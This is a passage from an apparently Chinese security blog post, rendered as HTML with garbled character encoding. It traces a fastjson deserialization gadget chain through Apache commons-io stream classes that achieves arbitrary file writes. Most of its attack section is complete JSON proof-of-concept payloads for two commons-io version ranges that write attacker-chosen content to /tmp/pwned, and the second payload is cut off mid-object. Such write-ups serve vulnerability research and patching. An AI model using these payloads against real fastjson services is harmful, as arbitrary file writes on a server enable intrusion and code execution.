data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132940024.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027132940024"></p><p>å‡å¦‚è¿™é‡Œçš„Writeræ˜¯FileWriterWithEncoding</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027191950126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027191950126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027191950126"></p><p>FileWriterWithEncodingæ¥æ”¶Fileä¸ºå‚æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027192058604.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027192058604.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027192058604"></p><p>æ„é€ å‡½æ•°å†…çš„initWriteråˆå§‹åŒ–äº†ä¸€ä¸ªOutputStreamWriterï¼Œå°è£…äº†FileOutputStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027192245895.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027192245895.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027192245895"></p><p>FileWriterWithEncoding.write-&gt;OutputStreamWriter.write-&gt;StreamEncoder.write</p><p>org.apache.commons.io.output.WriterOutputStream æ»¡è¶³äº†åˆ©ç”¨æ¡ä»¶3</p><p>org.apache.commons.io.output.FileWriterWithEncodingæ»¡è¶³äº†åˆ©ç”¨æ¡ä»¶1</p><p>ç°åœ¨è®©æˆ‘ä»¬ä¸²ä¸€ä¸‹åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">å­˜å‚¨<span class="type">char</span>åˆ°InputStream</span><br><span class="line">XmlStreamReader.doHttpStream -&gt;</span><br><span class="line">BOMInputStream.getBomCharsetName -&gt;</span><br><span class="line">BOMInputStream.getBom -&gt;</span><br><span class="line">BufferedInputStream.read -&gt;</span><br><span class="line">BufferedInputStream.fill -&gt;</span><br><span class="line"></span><br><span class="line">ReaderInputStream.read -&gt;</span><br><span class="line">ReaderInputStream.fillBuffer -&gt;</span><br><span class="line">CharSequenceReader.readè¯»å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">è¾“å‡ºInputStreamåˆ°OutputStreamåˆ°æ–‡ä»¶</span><br><span class="line">XmlStreamReader.doHttpStream -&gt;</span><br><span class="line">BOMInputStream.getBomCharsetName -&gt;</span><br><span class="line">BOMInputStream.getBom -&gt;</span><br><span class="line">BufferedInputStream.read -&gt;</span><br><span class="line">BufferedInputStream.fill -&gt;</span><br><span class="line"></span><br><span class="line">TeeInputStream.read -&gt;</span><br><span class="line">WriterOutputStream.write -&gt;</span><br><span class="line">WriterOutputStream.flushOutput -&gt;</span><br><span class="line">FileWriterWithEncoding.write -&gt;</span><br><span class="line">StreamEncoder.write -&gt;</span><br><span class="line">StreamEncoder.implWrite -&gt;</span><br><span class="line">StreamEncoder.writeByteså†™æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>ç„¶è€Œåœ¨StreamEncoder.write-&gt;implWriteä¸­ï¼Œå¦‚æœä¸æ»¡ç¼“å†²åŒºï¼ˆUnderflowï¼‰ä¼šbreakï¼Œç¼“å†²åŒºæ»¡æ‰ä¼šwriteBytes</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027195307686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027195307686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027195307686"></p><p>é»˜è®¤çš„ç¼“å†²åŒºå¤§å°æ˜¯8192</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027195913496.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027195913496.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027195913496"></p><p>ä½†æ˜¯ä¼ å…¥çš„BufferedInputStreamä¸€å—åªæœ‰4096</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027200003411.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027200003411.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027200003411"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027200032893.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027200032893.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027200032893"></p><p>åˆ©ç”¨$refå¯ä»¥å¤šæ¬¡è°ƒç”¨StreamEncoder.implWriteå‘åŒä¸€ä¸ªç¼“å†²åŒºå†™å…¥æµæ•°æ®ï¼Œç›´åˆ°overflowå†™æ–‡ä»¶</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>commons-ioåœ¨2.0-2.6å’Œ2.7-2.8ç‰ˆæœ¬ä¹‹é—´å„æ–‡ä»¶çš„æ„é€ å‡½æ•°å‚æ•°åæœ‰äº›è®¸ä¸åŒ</p><p>æ¯”å¦‚2.5ç‰ˆæœ¬ä¸‹CharSequenceReaderæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027202206789.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027202206789.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027202206789"></p><p>è€Œ2.7ç‰ˆæœ¬ä¸‹CharSequenceReaderæœ‰ä¸‰ä¸ªæ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027202325511.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027202325511.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027202325511"></p><p>2.0-2.6ç‰ˆæœ¬POCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>2.7-2.8ç‰ˆæœ¬POCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">2147483647</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span 